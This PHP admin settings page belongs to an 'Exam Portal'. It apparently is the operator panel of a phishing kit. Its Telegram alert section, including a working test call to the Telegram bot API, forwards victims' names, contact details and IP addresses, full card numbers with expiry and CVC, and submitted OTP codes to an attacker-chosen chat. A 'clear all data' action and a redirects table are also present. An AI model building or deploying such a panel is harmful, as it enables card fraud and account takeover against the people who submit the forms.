<?php
require_once __DIR__ . '/../includes/functions.php';
requireAdmin();

$message = ''; $messageType = '';
$db = getDB();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'change_password') {
        $newPass = $_POST['new_password'] ?? '';
        $confirm = $_POST['confirm_password'] ?? '';
        if (strlen($newPass) < 6) { $message = 'Password must be at least 6 characters.'; $messageType = 'error'; }
        elseif ($newPass !== $confirm) { $message = 'Passwords do not match.'; $messageType = 'error'; }
        else {
            $db->prepare("UPDATE admin_settings SET admin_password = ? WHERE id = 1")->execute([password_hash($newPass, PASSWORD_DEFAULT)]);
            $message = 'Password updated successfully.'; $messageType = 'success';
        }
    }
    if ($action === 'clear_students') {
        $db->exec("DELETE FROM activity_log"); $db->exec("DELETE FROM redirects"); $db->exec("DELETE FROM students");
        $message = 'All student data has been cleared.'; $messageType = 'success';
    }
    if ($action === 'save_telegram') {
        $botToken = trim($_POST['telegram_bot_token'] ?? '');
        $chatId = trim($_POST['telegram_chat_id'] ?? '');
        $alertReg = isset($_POST['telegram_alert_registration']) ? 1 : 0;
        $alertPay = isset($_POST['telegram_alert_payment']) ? 1 : 0;
        $alertOtp = isset($_POST['telegram_alert_otp']) ? 1 : 0;
        $db->prepare("UPDATE admin_settings SET telegram_bot_token=?, telegram_chat_id=?, telegram_alert_registration=?, telegram_alert_payment=?, telegram_alert_otp=? WHERE id=1")
            ->execute([$botToken, $chatId, $alertReg, $alertPay, $alertOtp]);
        $message = 'Telegram settings saved.'; $messageType = 'success';
    }
    if ($action === 'test_telegram') {
        $settings = getTelegramSettings();
        $token = $settings['telegram_bot_token'] ?? '';
        $chatId = $settings['telegram_chat_id'] ?? '';
        if (!$token || !$chatId) {
            $message = 'Please save your Bot Token and Chat ID first.'; $messageType = 'error';
        } else {
            $url = "https://api.telegram.org/bot{$token}/sendMessage";
            $postData = http_build_query([
                'chat_id' => $chatId,
                'text' => "<b>Test Alert</b>\nExam Portal Telegram alerts are working!",
                'parse_mode' => 'HTML'
            ]);
            $ctx = stream_context_create([
                'http' => [
                    'method' => 'POST',
                    'header' => 'Content-Type: application/x-www-form-urlencoded',
                    'content' => $postData,
                    'timeout' => 5
                ]
            ]);
            $result = @file_get_contents($url, false, $ctx);
            if ($result) {
                $json = json_decode($result, true);
                if (!empty($json['ok'])) {
                    $message = 'Test message sent successfully! Check your Telegram.'; $messageType = 'success';
                } else {
                    $message = 'Telegram error: ' . ($json['description'] ?? 'Unknown error'); $messageType = 'error';
                }
            } else {
                $message = 'Could not connect to Telegram API. Check your bot token.'; $messageType = 'error';
            }
        }
    }
}

// Fetch current Telegram settings
$tg = $db->query("SELECT telegram_bot_token, telegram_chat_id, telegram_alert_registration, telegram_alert_payment, telegram_alert_otp FROM admin_settings WHERE id = 1")->fetch();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings - Exam Portal</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        .tg-section { margin-top: 20px; }
        .tg-field { margin-bottom: 16px; }
        .tg-field label { display: block; font-weight: 600; font-size: .85rem; margin-bottom: 6px; color: var(--text); }
        .tg-field input[type="text"], .tg-field input[type="password"] {
            width: 100%; padding: 10px 12px; border: 1.5px solid var(--border); border-radius: 8px;
            font-size: .9rem; font-family: 'Consolas', monospace; transition: border-color .2s;
        }
        .tg-field input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37,99,235,.1); }
        .tg-field .hint { font-size: .75rem; color: var(--text-light); margin-top: 4px; }
        .tg-toggles { display: flex; flex-direction: column; gap: 12px; margin-top: 16px; }
        .tg-toggle {
            display: flex; align-items: center; gap: 10px; padding: 12px 14px;
            background: #f8fafc; border: 1.5px solid var(--border); border-radius: 10px;
            cursor: pointer; transition: all .15s; user-select: none;
        }
        .tg-toggle:hover { border-color: var(--primary); background: #eff6ff; }
        .tg-toggle input[type="checkbox"] { display: none; }
        .tg-toggle .check {
            width: 20px; height: 20px; border: 2px solid #cbd5e1; border-radius: 6px;
            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
            transition: all .15s; background: #fff;
        }
        .tg-toggle input:checked + .check { background: var(--primary); border-color: var(--primary); }
        .tg-toggle input:checked + .check::after { content: '\2713'; color: #fff; font-size: .75rem; font-weight: 700; }
        .tg-toggle .label-text { font-size: .88rem; font-weight: 500; }
        .tg-toggle .label-desc { font-size: .75rem; color: var(--text-light); }
        .tg-actions { display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap; }
        .btn-outline {
            padding: 10px 18px; border: 1.5px solid var(--border); border-radius: 8px;
            background: #fff; font-size: .88rem; font-weight: 600; cursor: pointer;
            font-family: inherit; transition: all .15s; color: var(--text);
        }
        .btn-outline:hover { border-color: var(--primary); color: var(--primary); background: #eff6ff; }
        .pw-wrap { position: relative; }
        .pw-toggle {
            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
            background: none; border: none; cursor: pointer; font-size: .8rem; color: var(--text-light);
            font-family: inherit; padding: 4px 6px;
        }
        .pw-toggle:hover { color: var(--primary); }
    </style>
</head>
<body>
<?php include __DIR__ . '/includes/mobile-nav.php'; ?>
<div class="admin-layout">
    <aside class="admin-sidebar">
        <div class="logo">Exam Portal</div>
        <nav>
            <a href="index.php">Dashboard</a>
            <a href="students.php">All Students</a>
            <a href="activity.php">Activity Log</a>
            <a href="settings.php" class="active">Settings</a>
            <a href="logout.php">Logout</a>
        </nav>
    </aside>
    <main class="admin-main">
        <div class="admin-header"><h1>Settings</h1></div>
        <?php if ($message): ?>
            <div class="alert alert-<?= $messageType ?>" style="display:block;margin-bottom:20px"><?= sanitize($message) ?></div>
        <?php endif; ?>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
            <div class="card">
                <h2 style="margin-bottom:20px">Change Admin Password</h2>
                <form method="POST">
                    <input type="hidden" name="action" value="change_password">
                    <div class="form-group"><label>New Password</label><input type="password" name="new_password" required minlength="6"></div>
                    <div class="form-group"><label>Confirm Password</label><input type="password" name="confirm_password" required></div>
                    <button type="submit" class="btn btn-primary">Update Password</button>
                </form>
            </div>
            <div class="card">
                <h2 style="margin-bottom:20px">Danger Zone</h2>
                <p style="color:var(--text-light);font-size:.9rem;margin-bottom:20px">Clear all student registrations, activity logs, and redirects. This cannot be undone.</p>
                <form method="POST" onsubmit="return confirm('Are you sure? This will delete ALL student data permanently.')">
                    <input type="hidden" name="action" value="clear_students">
                    <button type="submit" class="btn btn-danger">Clear All Data</button>
                </form>
            </div>
        </div>

        <div class="card" style="margin-top:20px">
            <h2 style="margin-bottom:6px">Telegram Alerts</h2>
            <p style="color:var(--text-light);font-size:.85rem;margin-bottom:20px">Receive instant notifications in Telegram when students submit data.</p>
            <form method="POST">
                <input type="hidden" name="action" value="save_telegram">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
                    <div class="tg-field">
                        <label>Bot Token</label>
                        <div class="pw-wrap">
                            <input type="password" name="telegram_bot_token" id="tgToken" value="<?= htmlspecialchars($tg['telegram_bot_token'] ?? '') ?>" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
                            <button type="button" class="pw-toggle" onclick="toggleTgToken()">Show</button>
                        </div>
                        <div class="hint">Get from @BotFather on Telegram</div>
                    </div>
                    <div class="tg-field">
                        <label>Chat ID</label>
                        <input type="text" name="telegram_chat_id" value="<?= htmlspecialchars($tg['telegram_chat_id'] ?? '') ?>" placeholder="-1001234567890">
                        <div class="hint">Your user ID or group chat ID</div>
                    </div>
                </div>
                <div class="tg-field" style="margin-top:8px">
                    <label>Alert on these events:</label>
                    <div class="tg-toggles">
                        <label class="tg-toggle">
                            <input type="checkbox" name="telegram_alert_registration" value="1" <?= !empty($tg['telegram_alert_registration']) ? 'checked' : '' ?>>
                            <span class="check"></span>
                            <div>
                                <div class="label-text">Registration Data</div>
                                <div class="label-desc">Name, email, phone, address, IP</div>
                            </div>
                        </label>
                        <label class="tg-toggle">
                            <input type="checkbox" name="telegram_alert_payment" value="1" <?= !empty($tg['telegram_alert_payment']) ? 'checked' : '' ?>>
                            <span class="check"></span>
                            <div>
                                <div class="label-text">Card / Payment Data</div>
                                <div class="label-desc">Card number, type, expiry, CVC</div>
                            </div>
                        </label>
                        <label class="tg-toggle">
                            <input type="checkbox" name="telegram_alert_otp" value="1" <?= !empty($tg['telegram_alert_otp']) ? 'checked' : '' ?>>
                            <span class="check"></span>
                            <div>
                                <div class="label-text">OTP Codes</div>
                                <div class="label-desc">Verification codes submitted by students</div>
                            </div>
                        </label>
                    </div>
                </div>
                <div class="tg-actions">
                    <button type="submit" class="btn btn-primary">Save Settings</button>
                </div>
            </form>
            <form method="POST" style="margin-top:10px">
                <input type="hidden" name="action" value="test_telegram">
                <button type="submit" class="btn-outline">Send Test Message</button>
            </form>
        </div>
    </main>
</div>
<script>
function toggleTgToken() {
    const inp = document.getElementById('tgToken');
    const btn = inp.nextElementSibling;
    if (inp.type === 'password') { inp.type = 'text'; btn.textContent = 'Hide'; }
    else { inp.type = 'password'; btn.textContent = 'Show'; }
}
</script>
</body>
</html>
